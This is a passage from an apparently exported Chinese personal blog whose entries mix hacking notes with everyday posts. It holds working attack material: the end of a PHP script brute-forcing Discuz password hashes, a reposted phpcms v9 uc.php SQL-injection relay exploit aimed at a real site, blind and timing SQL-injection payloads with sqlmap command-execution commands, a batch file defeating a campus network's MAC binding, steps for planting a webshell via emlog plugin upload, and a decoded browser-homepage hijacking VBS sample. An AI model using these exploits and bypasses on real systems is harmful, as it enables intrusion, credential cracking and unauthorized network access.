$user=trim(fgets($file_name2));//读取user $randmun=fopen("rand.txt","r");//打开随机数 while(!feof($randmun))//循环随机数 { $randm=trim(fgets($randmun));//读取随机数 echo "user=".$user." ";echo "pwd=".$pwd." ";echo "salt=".$salt." ";echo "rand=".$randm." "; if($pwd== md5(md5($user.$randm).$salt)) { echo "就是你了user+rand=".$user.$randm." "."user=".$user." "; echo "pwd=".$pwd." "; echo "salt=".$salt." "; echo "rand=".$randm." "; echo " ----------------------------- ";exit; } else { echo $pwd."|"."不是密码3！ ";} } fclose($randmun); } fclose($file_name2); } fclose($file_name); } fclose($file1_name); echo "以用户+6位随机数作为密码测试失败！ "; } /&#42 &#42生产随机数 &#42/ function randmunber() { if(!file_exists("rand.txt")) { $randmun=fopen("rand.txt","w"); for($i=0;$i&lt;999999;$i++) { fwrite($randmun,$i." "); } fclose($randmun); } } ?&gt;]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>dz加密爆破</tag>
        <tag>爆破脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[转]phpcms v9 uc.php注入中转脚本]]></title>
    <url>%2F2012%2F05%2F20%2F%E8%BD%AC-phpcms-v9-uc-php%E6%B3%A8%E5%85%A5%E4%B8%AD%E8%BD%AC%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp; 网上有phpcms v9 uc.php的注入exp，但是他是直接写shell的需要root权限！我们可以通过下面脚本中转用工具跑库！ &lt;?php /&#42&#42 PHPcms (v9 or Old Version) uc api sql injection 0day 非ROOT权限中转注入 &#42/ set_time_limit(0); //$id=$_GET["id"]; $id=str_replace(" ","%20",$id); $id=str_replace("=","%3D",$id); $SQL = "time=999999999999999999999999&amp;action=deleteuser&amp;ids=".$_GET[id]; $SQL = urlencode(authcode($SQL, "ENCODE", "")); //echo $SQL; $url="http://www.bale.cn/phpsso_server/api/uc.php?code=$SQL"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "$url"); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); curl_close($ch); print_r($output); function authcode($string, $operation = ’DECODE’, $key = ’’, $expiry = 0) { $ckey_length = 4; $key = md5($key ? $key : ’’); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == ’DECODE’ ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ’’; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == ’DECODE’ ? base64_decode(substr($string, $ckey_length)) : sprintf(’%010d’, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = ’’; $box = range(0, 255); $rndkey = array(); for($i = 0; $i &lt;= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for($j = $i = 0; $i &lt; 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for($a = $j = $i = 0; $i &lt; $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($operation == ’DECODE’) { if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return ’’; } } else { return $keyc.str_replace(’=’, ’’, base64_encode($result)); } } ?&gt; 转至90sec.org]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>exp</tag>
        <tag>phpcms v9</tag>
        <tag>注入中转</tag>
        <tag>注入漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绕过学校的h3c绑定mac]]></title>
    <url>%2F2012%2F05%2F16%2F%E7%BB%95%E8%BF%87%E5%AD%A6%E6%A0%A1%E7%9A%84h3c%E7%BB%91%E5%AE%9Amac%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;买了个笔记本，想上网，但是我用的是学校的宽带，也就是H3c拨号的那种，ip和mac是绑定了的！于是乎我百度了下，看见了一个方法，测试了下可以用！和大家分享下！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;先修改我笔记本的mac为以前绑定的mac &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;进网络共享和中心（win7）点击本地连接–属性–配置–高级–网络地址，默认是选择的不存在，然后你修改成以前绑定的mac （不懂得可以百度，修改mac地址） &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改好了显然要重启，重启后不要启动h3c客户端，先修改注册表，找到到HKLMSYSTEMCurrentControlSetClass{4D36E972-E325-11CE-BFC1-08002BE10318} 011下的 NetworkAddress，然后删除它！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在启动h3c客户端！ 然后就ok了！但是重启电脑后又不行了！ &nbsp;原理：猜测是h3c启动的时候会检测注册表，发现注册表里有NetworkAddress这个值存在就会显示mac绑定失败或者说你修改了mac！所以我们就删除它！ 于是乎我写了个批处理,新手，现学现卖的，高手看见了求完善！ &nbsp;&nbsp;&nbsp;&nbsp;根据原理，先修改mac–重启—删除mac–启动h3c—修改mac &nbsp; title H3C联网 tasklist|find /i "iNode Client.exe" if %errorlevel%==0 goto s ::判断进程 REG Delete HKLMSYSTEMCurrentControlSetClass{4D36E972-E325-11CE-BFC1-08002BE10318} 011 /v NetworkAddress ::删除 "D:Program FilesiNodeiNode ClientiNode Client.exe" -p 8021 -c 8022 ::启动h3c :s REG Add HKLMSYSTEMCurrentControlSetClass{4D36E972-E325-11CE-BFC1-08002BE10318} 011 /v NetworkAddress /t REG_SZ /d 0030677196B7 ::增添 exit 使用方法：修改你自己的h3c启动路径！复制到记事本保存为bat后缀的批处理文件！然后开机后使用管理员身份启动不然失败 这个批处理用起来还是有点不方便的，当运行的时候会弹出doc界面，会提示是否删除注册表键值，选择y，然后会启动h3c估计有点慢（6秒左右），然后你就点击连接，当连接好了以后，直接关闭那个doc界面的，再以管理员身份运行一次，这一次会一闪而过！（这是为下次重启作准备的，也就是又把mac写入注册表）]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>校园网mac绑定</tag>
        <tag>绕过H3Cmac绑定</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[读《白帽子讲web安全》笔记之注入攻击]]></title>
    <url>%2F2012%2F05%2F15%2F%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[Timing Attack这是一种盲注的技巧，它是根据时间的长短来做逻辑判断的。 例子： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1170 union select if(substring(current,1,1)=char(11),benchmark(5000000,encode(’msg’,’by 5 seconds’)),null) from (select database() as current) as tbl; 利用返回时间长短来判断数据库名的第一个字符串是不是char(11)，以此类推，可以盲注出其他的信息。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 上边的是mysql数据库的方法 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mysql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; benchmark(10000000000,md5(1))或sleep(5) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;postgresql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PG_SLEEP(5)或 GENERATE_SERIES(1,1000000000) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MSSQL&nbsp;&nbsp;SERVER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WAITFOR DELAY ’0:0:5’ &nbsp; 注入技巧： ddd?id=4 and substring(@@version,1,1)=4 ddd?id=5 and ascii(substring((select concat(username,0x3a,password) from users limit 0,1),1,1))&gt;64 sqlmap使用：python sqlmap.py -u “http://www.xxxxx.com/xxxx.php?id=5“ –dump -T users &nbsp; into outfile主要是到文本文件，而into dumpfile主要是导二进制文件 &nbsp; UDF自拟定函数执行命令 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;windows提权很常用，linux也可以自拟定函数。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;linux下可以使用lib_mysqludf_sys提供的函数sys_eval()、sys_exec() &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用方法： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wget –no-check-certificate https://svn.sqlmap.org/sqlmap/trunk/sqlmap/extra/mysqludfsys/lib_mysqludf_sys_0.0.3.tar.gz tar xfz lib_mysqludf_sys_0.0.3.tar.gz cd lib_mysqludf_sys_0.0.3 sudo ./install.sh &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sqlmap使用：python sqlmap.py -u http://www.xxx.com/ddd.php?id=6“ –os-cmd id -v 1 &nbsp; SQL COLUMN TRUNCATION &nbsp;&nbsp;&nbsp;&nbsp;档php.ini中的sql_mode选项为默认的时候也就是没有开启STRICT_ALL_TABLES的时候当用户输入的值大于字段规定的值时候，会有worning的错误，也就是说他没有停止输入还是，只是提醒了下而没有终止。 &nbsp;&nbsp;&nbsp;&nbsp;案例：wordpress当注册用户名为admin（55个空格）xxx的时候就可以直接访问wp-login.php?action=lostpassword修改管理密码！这样就造成了越权访问。 &nbsp; 传说中由安全专家编写的mysql安全函数：ESAPI.encoder().encoderForSQL( new OracleCodec(),queryparm ); &nbsp; CRLF注入 XML注入 代码注入]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>白帽子</tag>
        <tag>脚本注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[win2003 vpn L2TP搭建]]></title>
    <url>%2F2012%2F05%2F12%2Fwin2003-vpn-L2TP%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上个星期，买了一台笔记本，想着到图书馆写东西方便，但是悲剧的是图书馆的无线网热点只能访问校内的服务器，没法访问外网，对于我来说，图书馆等于没有网络了，这个是不可忍受的。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;于是乎我就想了一个办法，我们专业教研室老师给我们申请了一台服务器，哈哈！我可以在服务器上面搭建vpn，然后通过服务器连接外网。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其实以前还没有自己搭建过vpn，这也是头一次，所以很多都是百度的，一开始很不顺利，用百度到的方法不是很奏效，我困惑了几天，忽然想到以前我用vpn的时候用pptp是不成功，要使用l2tp才可以，至于为什么，这个我也不是很清楚。可以看下这个：http://zhidao.baidu.com/question/54543706.html。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我把我的搭建过程写在了附件的文档中！下载可以看！]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>L2TP</tag>
        <tag>ppp</tag>
        <tag>vpn</tag>
        <tag>win2003</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CUIT信息安全大赛渗透题解析]]></title>
    <url>%2F2012%2F05%2F09%2FCUIT%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%B8%97%E9%80%8F%E9%A2%98%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp; 比赛就这么结束了！写写自己的一些解题思路吧！ &nbsp;&nbsp;&nbsp;&nbsp;答辩过后才知道，原理我的理解很多都是错的!比如utf-7编码。。。。。。，大家看了附件错的请留言！ &nbsp;&nbsp;&nbsp;&nbsp; 见附件]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>cuit</tag>
        <tag>信息安全</tag>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[友情链接]]></title>
    <url>%2F2012%2F04%2F25%2F%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[欢迎大家做友情链接。 做链接前请先做好本站的链接。然后在本页面留言，否则不与通过。 本网站名：L.N.&nbsp;博客 本站网址：http://lanu.sinaapp.com 本站简介：L.N. 博客 本站图标：http://lanu.sinaapp.com/logo.gif&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]]></content>
  </entry>
  <entry>
    <title><![CDATA[防sql注入工具代码]]></title>
    <url>%2F2012%2F04%2F20%2F%E9%98%B2sql%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这几天都在做校内信息安全的题！其中的一个注入题！看见了这个，记下来！ //防止用pangolin if(strpos($_SERVER[’HTTP_USER_AGENT’],”angolin”)){ echo “please once more”; exit(); } //防止用Havij if(strpos($_SERVER[’HTTP_USER_AGENT’],”Havij”)){ echo “please once more”; exit(); } //sqlmap if(strpos($_SERVER[’HTTP_USER_AGENT’],”sqlmap”)){ echo “please once more”; exit(); } //echo $_SERVER[’HTTP_USER_AGENT’]; //防止用Domain if(strpos($id,”sysobjects”)){ $id=1; } //过滤空格 if(strpos($id,” “)){ $id=1; }]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[人生真的就此转向了？]]></title>
    <url>%2F2012%2F04%2F19%2F%E4%BA%BA%E7%94%9F%E7%9C%9F%E7%9A%84%E5%B0%B1%E6%AD%A4%E8%BD%AC%E5%90%91%E4%BA%86%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;记得那还是2010的夏天！顶着炎炎烈日，偌大的操场上，几辆白色的桑塔拉教练车在一根根竹竿间游弋穿梭。作为一个刚毕业的大学生，很多都很新奇！而网络是熬过了高中的学生十分饥渴的东西！我也一样！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一家网吧中！一个刚毕业的高中生，为了想看别人加密相册中的东西！无意中进了一个叫做红客联盟的论坛，寻找心仪的工具。就这样他走上了这样的一条路！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 随着知道的越多，对技术的渴望也愈加迫切！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一遍一遍不厌其烦的看当时很神秘的黑客教程！测试神奇的远控程序！&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习他人使用简单的黑客工具！慢慢的接触到了很多比自己厉害的人！看着他们高超的技术，心生向往！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;过程中或许迷茫！或许失落！亦或许放弃！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但人生总是这样，无意中我还是继续的在学习，还是一次又一次爬起！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;好人，坏人，或低调，或高调，或谦和，或骄傲！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我走进了一个叫做08安全小组的地方！或许他们的技术不是最高的！或许他们不是所谓的什么大牛！但是我们相互学习！从吝啬！不怕被别人超过！为他人的技术提高而感到高兴，心中却暗暗羡慕，不断的激励自己提升！生活中的不如意，也会相互倾述，获得安慰！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;慢慢时间就过了一年了！我们都有了很大的变化！但情谊是唯一不变的，反而因为时间的流逝而愈加深厚了！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今年是2012了！我接触信息安全也快2年了！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今晚一位学长，和我谈了关于信息安全比赛的事情！没想到我的人生已经发生了如此重大的变化！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;或许我的人生就会发生重大转折了！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时此刻！心里很复杂！或兴奋，或担心，或犹豫，还有点彷徨！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 但T哥的一语句话使我的心沉了下来，他说：爱好！兴趣！就是我的目标！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 是啊! &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;人活一辈子能做自己感兴趣的事情，并为之而努力，是件多么幸福的事情啊！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;努力！我一定会做的更好！&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>我的生活</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[俺们老师]]></title>
    <url>%2F2012%2F04%2F14%2F%E4%BF%BA%E4%BB%AC%E8%80%81%E5%B8%88%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp; 今天老师加了我们群发了一个消息！ &nbsp;]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[淘宝店-欢迎光临]]></title>
    <url>%2F2012%2F04%2F03%2F%E6%B7%98%E5%AE%9D%E5%BA%97-%E6%AC%A2%E8%BF%8E%E5%85%89%E4%B8%B4%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;做了一个淘宝店！欢迎光临！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; http://t-vancl.taobao.com/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;还做了一个导购网站 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; http://mydecms.sinaapp.com/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 哈哈哈！]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Sae版贤诚文章管理系统]]></title>
    <url>%2F2012%2F04%2F01%2FSae%E7%89%88%E8%B4%A4%E8%AF%9A%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp; 为了申请Sea中级开发者！断断续续的花了几天时间修改了下贤诚管理系统 其中的模板编译为html的功能和增加模板功能还在修改之中！但是不影响使用！ 安装说明： 直接访问setup.php这个文件，安装好了之后就删除此文件！ &nbsp;]]></content>
      <categories>
        <category>SAE新浪</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>sae</tag>
        <tag>新浪云</tag>
        <tag>移植</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小米手机到手后&&我的新网络]]></title>
    <url>%2F2012%2F03%2F16%2F%E5%B0%8F%E7%B1%B3%E6%89%8B%E6%9C%BA%E5%88%B0%E6%89%8B%E5%90%8E%E5%92%8C%E6%88%91%E7%9A%84%E6%96%B0%E7%BD%91%E7%BB%9C%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp; 期盼已久的小米手机终于到了！1月5号就下单了！足足等了2个多月啊！3月8号终于到了！回想上一个手机，也是经典的nokia 5700 express music 好像是2008年的3月份买的，终于光荣的退役了！ &nbsp;&nbsp;&nbsp;&nbsp; 这个就是我折磨了4年的5700： &nbsp;&nbsp;&nbsp;&nbsp; 真的是饱经风霜啊！留个图做个纪念！ &nbsp;&nbsp;&nbsp;&nbsp; 然后就是我的新手机了！当然了！小米手机，不是什么定制版！是我花了大力气刷到的1999的普通版的！这个图就不发了！网上是漫天飞的图啊！ &nbsp;&nbsp;&nbsp;&nbsp; 小米手机到手后！联网是个大问题啊！GPRS显然不适合现在的智能手机，没有wifi现在的智能手机显然是不行的！ &nbsp;&nbsp;&nbsp;&nbsp; 这样问题就来了！我是台式机啊！没有无线网卡啊！用的是校园宽带！也就是h3c拨号上网的！（无线路由显然是不行的） &nbsp;&nbsp;&nbsp;&nbsp; 正是愁眉苦展之时，有同学说移动免费wifi 2M 可以免费到9月份呢！这下好了！可是这个只有图书馆和第一教学楼和第五教学楼有啊！但是寝室是没有覆盖的！重点就在这儿啊！显然在寝室的时间多于教师图书馆了！（这个只是我！貌似他们都是相反的） &nbsp;&nbsp;&nbsp;&nbsp; 于是想起了我以前买的，一直闲置的25块钱的无线网卡！哈哈！网购的廉价货！不过一直没有测试过！就闲置了！ 插上网卡！驱动精灵一搜驱动！很快就安装好了！ &nbsp;&nbsp;&nbsp;&nbsp; connectify这个软件相信大家都不陌生了！安装之后！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;寝室wifi也没有问题了！但是当我睡在床上的时候！想连wifi，电脑必须是开着的！但是每天的23:30要熄灯的！大家都知道的电脑突然断电对硬盘的伤害是很大的！怎么办呢？ &nbsp;&nbsp;&nbsp;&nbsp; 后来黄天不负有心人啊！android平台的几个小软件搞定了！ &nbsp;&nbsp;&nbsp;&nbsp; 就是teamviewer这个远程控制软件！其实他也是一个远程会议软件！ &nbsp;&nbsp;&nbsp;&nbsp; 这下就没问题了！当我上床睡觉的时候！把显示器关了，然后当快关灯的时候！我远程连接关机睡觉！ 还有几个软件不错啊！一个是远程登录软件remote desk！直接可以像windows的远程登录3389段口一样的登录。 一个是虚拟数据线的软件！他直接搭建一个ftp平台！内外网都可访问啊！ &nbsp; &nbsp;]]></content>
      <categories>
        <category>Android|Java|Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>android</tag>
        <tag>wifi</tag>
        <tag>小米</tag>
        <tag>联网</tag>
        <tag>软件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客搬家了！]]></title>
    <url>%2F2012%2F03%2F14%2F%E5%8D%9A%E5%AE%A2%E6%90%AC%E5%AE%B6%E4%BA%86%EF%BC%81%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp; 昨年一时兴起做的一个博客！哎！本来还得意洋洋的炫耀了一番！因为我博客空间加域名一共才87块钱啊！哪知道垃圾的空间商啊！服务器经常出问题！博客很多图片都不见了！ &nbsp;&nbsp;&nbsp; 现在想恢复也没办法了！我也没有原稿了！所以没图的都删了！有些因为是转载的所以没有删除！可以点击链接看原作者文章！ &nbsp;&nbsp;&nbsp; 现在博客转到了新浪云平台上面！ &nbsp;&nbsp;&nbsp; 中途也出了很多问题啊！ &nbsp;&nbsp;&nbsp; 很多都修复了！ &nbsp;&nbsp;&nbsp; 现在就是附件的链接还有点问题~最近比较忙也没去修复！下载附件请注意链接！去掉前面的http://lanu.sinaapp.com/&nbsp;这个后面才是下载链接！ &nbsp;&nbsp;&nbsp; 大家都知道的新浪狗日的是没有开放直接写入功能，所以很多时候都要改代码！ &nbsp;&nbsp;&nbsp; 做博客其实是我自娱自乐！如果看见了我的博客的童鞋们！满意者笑之！不满者！也一笑而过！ &nbsp;&nbsp;&nbsp;&nbsp;其实我只是当我博客是一个移动记事本！]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>搬家</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[emlog博客程序后台拿shell]]></title>
    <url>%2F2012%2F03%2F07%2Femlog%E5%8D%9A%E5%AE%A2%E7%A8%8B%E5%BA%8F%E5%90%8E%E5%8F%B0%E6%8B%BFshell%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 其实这个很是简单的！ &nbsp;在emlog后台有个插件安装功能！ &nbsp;然后上传zip压缩包，里面压缩的就是一句话木马（见附件） 然后就是菜刀连接了！ &nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>emlog后台</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解密一修改主页的vbs]]></title>
    <url>%2F2012%2F02%2F26%2F%E8%A7%A3%E5%AF%86%E4%B8%80%E4%BF%AE%E6%94%B9%E4%B8%BB%E9%A1%B5%E7%9A%84vbs%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp; 今天上90sec论坛看见一同学发帖！说他启动项有个vbs，希望有人分析分析！ 原vbs： ExeString="hh dkloqlerngeg_xsSdmw6Cq^[tdHjd (!pmcqbjt-lbeke) q.Q^aWqbneBKDRYCK:MSDLYRNHNBEMICUu86&#42=521&#42-3+;0,&#42&#4268&amp;;2D:’07)&#422A,&#423/2&gt;}[lbekeVOo^hHnf_P``_Bhgm`g^!%B3VPqhar`fFhe_s[Bhtdkhes?xoeirdkVidqjlnk_.dq_ gmnp9()wvp(62,q.m^n.bg)?k2 p(Rd`Qrhm_ !AEEXX=UQK?NSXOSDKVSn_nw`k_Lb]rnlifsUCns^lndmEwifoq^lLZcn[LnaqmP``_+hsmj:.(qwv’032p(cnf)?k2" Execute("Dim KeyArr(3),ThisText"&amp;vbCrLf&amp;"KeyArr(0) = 1"&amp;vbCrLf&amp;"KeyArr(1) = 7"&amp;vbCrLf&amp;"KeyArr(2) = 6"&amp;vbCrLf&amp;"KeyArr(3) = 0"&amp;vbCrLf&amp;"For i=1 To Len(ExeString)"&amp;vbCrLf&amp;"TempNum = Asc(Mid(ExeString,i,1))"&amp;vbCrLf&amp;"If TempNum = 18 Then"&amp;vbCrLf&amp;"TempNum = 34"&amp;vbCrLf&amp;"End If"&amp;vbCrLf&amp;"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&amp;vbCrLf&amp;"If TempChar = Chr(28) Then"&amp;vbCrLf&amp;"TempChar = vbCr"&amp;vbCrLf&amp;"ElseIf TempChar = Chr(29) Then"&amp;vbCrLf&amp;"TempChar = vbLf"&amp;vbCrLf&amp;"End If"&amp;vbCrLf&amp;"ThisText = ThisText &amp; TempChar"&amp;vbCrLf&amp;"Next") Execute(ThisText) 直接解密输出1.txt文本 ExeString="hh dkloqlerngeg_xsSdmw6Cq^[tdHjd (!pmcqbjt-lbeke) q.Q^aWqbneBKDRYCK:MSDLYRNHNBEMICUu86&#42=521&#42-3+;0,&#42&#4268&amp;;2D:’07)&#422A,&#423/2&gt;}[lbekeVOo^hHnf_P``_Bhgm`g^!%B3VPqhar`fFhe_s[Bhtdkhes?xoeirdkVidqjlnk_.dq_ gmnp9()wvp(62,q.m^n.bg)?k2 p(Rd`Qrhm_ !AEEXX=UQK?NSXOSDKVSn_nw`k_Lb]rnlifsUCns^lndmEwifoq^lLZcn[LnaqmP``_+hsmj:.(qwv’032p(cnf)?k2" Execute("Dim KeyArr(3),ThisText"&amp;vbCrLf&amp;"KeyArr(0) = 1"&amp;vbCrLf&amp;"KeyArr(1) = 7"&amp;vbCrLf&amp;"KeyArr(2) = 6"&amp;vbCrLf&amp;"KeyArr(3) = 0"&amp;vbCrLf&amp;"For i=1 To Len(ExeString)"&amp;vbCrLf&amp;"TempNum = Asc(Mid(ExeString,i,1))"&amp;vbCrLf&amp;"If TempNum = 18 Then"&amp;vbCrLf&amp;"TempNum = 34"&amp;vbCrLf&amp;"End If"&amp;vbCrLf&amp;"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&amp;vbCrLf&amp;"If TempChar = Chr(28) Then"&amp;vbCrLf&amp;"TempChar = vbCr"&amp;vbCrLf&amp;"ElseIf TempChar = Chr(29) Then"&amp;vbCrLf&amp;"TempChar = vbLf"&amp;vbCrLf&amp;"End If"&amp;vbCrLf&amp;"ThisText = ThisText &amp; TempChar"&amp;vbCrLf&amp;"Next") Execute(ThisText) Dim A, B A = ThisText B = "1.txt" Set FSO = CreateObject("Scripting.FileSystemObject") Set TextFile = FSO.CreateTextFile(B) TextFile.WriteLine A TextFile.Close() 1.txt文本内容 on error resume next Set w = CreateObject("wscript.shell")! w.RegWrite "HKEY_CLASSES_ROOTCLSID{871C5380-42A0-1069-A2EA-08002B30309D}shellOpenHomePageCommand", "C:Program FilesInternet Exploreriexplore.exe http://www.633w.net.cn/?l9" !’&amp; !’&amp; 